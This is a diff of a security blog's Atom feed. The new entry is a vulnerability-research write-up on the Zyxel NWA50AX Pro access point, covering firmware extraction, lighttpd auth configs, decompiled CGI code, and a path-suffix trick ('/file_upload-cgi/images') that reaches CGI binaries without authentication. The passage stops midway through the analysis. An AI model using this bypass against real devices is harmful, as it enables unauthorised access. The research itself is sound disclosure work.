@@ -1,4 +1,355 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-04-28T19:18:33+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">GFI MailEssentials - Yet Another .NET Target</title><link href="http://localhost:4000/vulns4free/2025/04/28/mailessentials.html" rel="alternate" type="text/html" title="GFI MailEssentials - Yet Another .NET Target" /><published>2025-04-28T03:00:00+02:00</published><updated>2025-04-28T03:00:00+02:00</updated><id>http://localhost:4000/vulns4free/2025/04/28/mailessentials</id><content type="html" xml:base="http://localhost:4000/vulns4free/2025/04/28/mailessentials.html">&lt;p&gt;What is this product &lt;em&gt;GFI MailEssentials&lt;/em&gt; all about? We’re living the future, right? So let’s ask the GFI AI.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-17T23:06:24+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Zyxel NWA50AX Pro - Discovery of an Nday Variant</title><link href="http://localhost:4000/vulns4free/2025/06/17/zyxel-nday-variant.html" rel="alternate" type="text/html" title="Zyxel NWA50AX Pro - Discovery of an Nday Variant" /><published>2025-06-17T03:00:00+02:00</published><updated>2025-06-17T03:00:00+02:00</updated><id>http://localhost:4000/vulns4free/2025/06/17/zyxel-nday-variant</id><content type="html" xml:base="http://localhost:4000/vulns4free/2025/06/17/zyxel-nday-variant.html">&lt;p&gt;Today was an eventful day thanks to many interesting blog posts, e.g. from my &lt;a href=&quot;https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/&quot;&gt;friends at watchTowr&lt;/a&gt;. So I thought, why not publish a small quick-and-dirty blog post myself about a story from last week? This blog post may not be of the usual quality, but it was a good time to write it.&lt;/p&gt;
+
+&lt;p&gt;A few days ago I went on vacation in the mountains. Relaxing on green meadows, breathing in the mountain air and a hike every day to recharge my batteries from vulnerability research (VR). Getting away from work in the meantime turned out to be difficult once again, at least for one evening. After a long day on my feet, I would sit with a beer in the late night and stare around the apartment with satisfaction. Suddenly, I spotted this little buddy. It’s name was &lt;strong&gt;Zyxel NWA50AX Pro&lt;/strong&gt;, &lt;a href=&quot;https://www.zyxel.com/global/en/products/wireless/ax3000-4-stream-wifi-6-dual-radio-nebulaflex-access-point-nwa50ax-pro&quot;&gt;a multi-gig WiFi 6 access point for small businesses&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/images/zyxel/zyxel_device.png&quot; alt=&quot;Zyxel Device&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This story will later explain the twist from 0day euphoria to nday but I don’t want to anticipate too much at this stage.&lt;/p&gt;
+
+&lt;h1 id=&quot;gathering-information&quot;&gt;Gathering Information&lt;/h1&gt;
+
+&lt;p&gt;I started asking Google about this device a bit and of course searched for publicly known vulnerabilities. A few were found, even with critical rating, injecting things into
+host headers, cookies etc. Without being biased, I began searching for the firmware which was quickly found &lt;a href=&quot;https://www.zyxel.com/global/en/support/download?model=nwa50ax-pro&quot;&gt;here&lt;/a&gt;.
+Feeding my &lt;a href=&quot;https://unblob.org/&quot;&gt;unblob&lt;/a&gt; script with it easily revealed a squashfs file system.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin  init   mnt      rom              rootfs_data.img_extract  tmp   var
+dev  lib    overlay  root             sbin                     usr   www
+etc  lib64  proc     rootfs_data.img  sys                      util
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Browsing through a few directories led me to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin  lighttpd  sbin  ssl  zyxel-diaginfo  zyxel-gui
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.lighttpd.net/&quot;&gt;lighttpd&lt;/a&gt; is a well-known web server used for embedded devices, so in the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conf&lt;/code&gt; directory usually lies the config file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lighttpd.conf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var.log_root = &quot;/var/log&quot;
+var.server_root = &quot;/usr/local/lighttpd&quot;
+var.state_dir = &quot;/var/run&quot;
+var.conf_dir = &quot;/usr/local/lighttpd/conf&quot;
+
+server.tag = &quot;&quot;
+server.document-root = &quot;/usr/local/zyxel-gui/htdocs&quot;
+server.errorlog = log_root + &quot;/error.log&quot;
+server.pid-file = state_dir + &quot;/lighttpd.pid&quot;
+server.stat-cache-engine = &quot;simple&quot;
+server.stream-request-body = 2
+server.stream-response-body = 2
+
+server.modules = (
+  &quot;mod_access&quot;,
+  &quot;mod_alias&quot;,
+  &quot;mod_redirect&quot;,
+  &quot;mod_rewrite&quot;,
+  &quot;mod_setenv&quot;,
+  &quot;mod_openssl&quot;
+)
+
+index-file.names += (
+  &quot;weblogin.cgi&quot;, &quot;index.html&quot;, &quot;index.htm&quot;
+)
+
+$HTTP[&quot;url&quot;] =~ &quot;\.pdf$&quot; {
+  server.range-requests = &quot;disable&quot;
+}
+
+$HTTP[&quot;host&quot;] == &quot;nap-slogin.nebula.zyxel.com&quot; {
+   url.rewrite-once = ( &quot;^/CP/(.*)&quot; =&amp;gt; &quot;/cgi-bin/tmp/captive-portal/$1&quot;)
+}
+
+server.follow-symlink = &quot;enable&quot;
+server.upload-dirs = ( &quot;/tmp&quot; )
+
+alias.url += (&quot;/pub/&quot; =&amp;gt; &quot;/tmp/daily-report/pub/&quot;)
+alias.url += (&quot;/lang/&quot; =&amp;gt; &quot;/var/zyxel/lang/&quot;)
+
+## Load the module configs.
+include &quot;conf.d/mime.conf&quot;
+include &quot;conf.d/auth_zyxel.conf&quot;
+include &quot;conf.d/setenv.conf&quot;
+include &quot;conf.d/cgi.conf&quot;
+
+## Load runtime generated conf
+include &quot;/var/zyxel/service_conf/httpd_zld.conf&quot;
+include &quot;/var/zyxel/service_conf/portal_used.conf&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;More configuration files were included via directives such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_zyxel.conf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi.conf&lt;/code&gt;.
+A bit of browsing on the guest device was all I got, because obviously I didn’t have the opportunity to take the device apart and destroy it.
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.cgi&lt;/code&gt; endpoints were quickly spotted in my proxy tool, even on the login page.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/images/zyxel/zyxelbefore.png&quot; alt=&quot;Login Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Calling some CGIs was allowed, most of them not: as expected. So how was authentication and authorization handled here? Maybe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_zyxel.conf&lt;/code&gt; might give us some clues.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server.modules += ( &quot;mod_auth_zyxel&quot; )
+
+#
+# If URL does not match while list patterns below, request will be redirect to this location.
+# NOTE: Admin type user will never be redirected.
+#
+auth_zyxel.AuthZyxelRedirect = &quot;/&quot;
+
+#
+# Global URL whilte list pattern
+#
+auth_zyxel.AuthZyxelSkipPattern	= (
+	&quot;/images&quot;,
+	&quot;/weblogin.cgi&quot;,
+	&quot;/I18N.js&quot;,
+	&quot;/language&quot;,
+	&quot;/logo&quot;,
+	&quot;/login.cgi&quot;,
+	&quot;/Clicktocontinue.cgi&quot;,
+	&quot;/nebula_ap_redirect.cgi&quot;,
+	&quot;/logout.cgi&quot;,
+	&quot;/find_me.cgi&quot;,
+	&quot;/social_login.cgi&quot;,
+	&quot;/nebula_ga_auth.cgi&quot;,
+	&quot;/userdata.html&quot;,
+	&quot;/jquery-3.2.1.min.js&quot;,
+	&quot;/tmp/captive-portal/&quot;,
+	&quot;/CP/&quot;,
+	&quot;/limit.html&quot;,
+	&quot;/fbwifi_forward.cgi&quot;,
+	&quot;/fbwifi_auth.cgi&quot;,
+	&quot;/fbwifi_continue.cgi&quot;,
+	&quot;/fbwifi_error.cgi&quot;,
+	&quot;/cdr.cgi&quot;,
+	&quot;/ip_reputation_block.cgi&quot;,
+	&quot;/dns_filter.cgi&quot;,
+	&quot;/cloud_idp_login.cgi&quot;
+)
+
+#
+# User or Guest type user whilte list pattern
+#
+auth_zyxel.AuthZyxelSkipUserPattern = ( 
+	&quot;/setuser.cgi&quot;,
+	&quot;/grant_access.html&quot;,
+	&quot;/cgi-bin/&quot;,
+	&quot;/frame_access.html&quot;,
+	&quot;/dummy.html&quot;
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Without really knowing anything about this target, words like &lt;em&gt;AuthZyxelSkipPattern&lt;/em&gt; and &lt;em&gt;AuthZyxelSkipUserPattern&lt;/em&gt; clearly trigger our VR senses.
+The blackbox guy in me simply put all these paths into a word list and tried to &lt;a href=&quot;https://github.com/ffuf/ffuf&quot;&gt;ffuf&lt;/a&gt; anything interesting out of it.
+Surprisingly, instead of a 302 status code suddenly some 200/400/500 appeared out of nothing. The permutation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yourenotallowedtoaccess.cgi/images&lt;/code&gt;
+gave access to the CGI binaries’ logic from an unauthenticated context.&lt;/p&gt;
+
+&lt;h1 id=&quot;lighttpd-questions&quot;&gt;lighttpd Questions&lt;/h1&gt;
+
+&lt;p&gt;I was asking myself: is this a Zyxel thing or intended behavior in lighttpd configurations? We needed some testing ground, didn’t we?
+Docker is our friend for quick setups.&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;lighttpd&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sebp/lighttpd&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/home/temp/lighttpdCGI/home:/var/www/localhost/htdocs&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/home/temp/lighttpdCGI/config:/etc/lighttpd&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;8181:80&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;How does a proper CGI configuration with lighttpd look like: read &lt;a href=&quot;https://redmine.lighttpd.net/projects/lighttpd/wiki/Mod_cgi&quot;&gt;official documentation&lt;/a&gt;.
+Using the Docker image author’s &lt;a href=&quot;https://github.com/spujadas/lighttpd-docker&quot;&gt;GitHub configuration files&lt;/a&gt;, I made some modifications making it CGI aware.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var.server_root = &quot;/var/www/localhost/htdocs&quot;
+
+server.modules = (
+SNIP
+    &quot;mod_alias&quot;,
+SNIP
+    &quot;mod_cgi&quot;
+)
+
+alias.url += ( &quot;/cgi-bin&quot; =&amp;gt; server_root + &quot;/cgi-bin&quot; )
+$HTTP[&quot;url&quot;] =~ &quot;/cgi-bin/&quot; {
+    cgi.assign = ( &quot;&quot; =&amp;gt; &quot;&quot; )
+}
+
+cgi.assign     = (
+    &quot;.cgi&quot; =&amp;gt; &quot;&quot;
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home/cgi-bin&lt;/code&gt; directory, we put a very simple CGI program&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-type: text/plain&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello World!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;compiled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt; statically on our host system and copied over. Starting the Docker container, and testing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/test.cgi&lt;/code&gt; versus &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/test.cgi/hiking&lt;/code&gt;
+gave the same results: the CGI was executed for both variants. Ok, that was enough of a proof for me to proceed with the Zyxel device.&lt;/p&gt;
+
+&lt;h1 id=&quot;hunting-the-proper-cgi&quot;&gt;Hunting the Proper CGI&lt;/h1&gt;
+
+&lt;p&gt;Now, we could reach probably any CGI binary without authentication, I started searching for interesting functions in each of them manually.
+All binaries found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/lighttpd/cgi-bin&lt;/code&gt; were put into Ghidra for a proper inspection. After an hour or so I landed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_upload-cgi&lt;/code&gt;.
+Would it have been a good idea to search for this CGI binary name now if someone else did some VR work already? Naaaaah, I’m on vacation so the serious
+VR methodologies didn’t apply to me.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;entry&lt;/code&gt; export was calling the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FUN_001016a0&lt;/code&gt;. I’ll walk you through the interesting parts step by step. Be aware that I of course renamed
+quite a few variables for explanatory reasons.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qcgireq_setoption&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_SlashTmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qcgireq_setoption&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qcgireq_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qcgireq_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff9e58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nl&quot;&gt;LAB_00101998:&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;FUN_0010229c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_2808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LAB_00101778&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DAT_00114260&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_00102d2c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acStack_2408&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s.length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acStack_2408&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [4]&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff9e57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LAB_00101998&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At [1] the content of a request was stored at the address of the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request&lt;/code&gt;. A certain query parameter was then read at [2] (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv&lt;/code&gt; in this case)
+or even more interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_path&lt;/code&gt; at [3]. If the query parameter wasn’t set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iVar2&lt;/code&gt; was equal to 0 and we would hit the branch at [4].
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uVar3&lt;/code&gt; held an error code and got returned in the response. This was super convenient from my “static analysis and blackbox device access” perspective.&lt;/p&gt;
+
+&lt;p&gt;This code was a recurring pattern of this function and so I could simply control which branch my request was running into depending on the response error codes.
+E.g. by not setting any parameters with a simple GET request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/file_upload-cgi/images&lt;/code&gt;, the following page was returned.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/2 200 OK
+Content-Type: text/html
+SNIP
+
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
+var errno0=-25001; var errmsg0=&quot;Warning ULCGI no any text typed!&quot;;
+top.frames[2].frames[1].document.(null).return_errno.value=errno0; top.frames[2].frames[1].document.(null).return_errmsg.value=errmsg0;
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;errno0=-25001&lt;/code&gt; corresponds to exactly one of the error codes of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uVar3&lt;/code&gt;. Flowing through the functions’ code from top to bottom, I stopped at this.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span 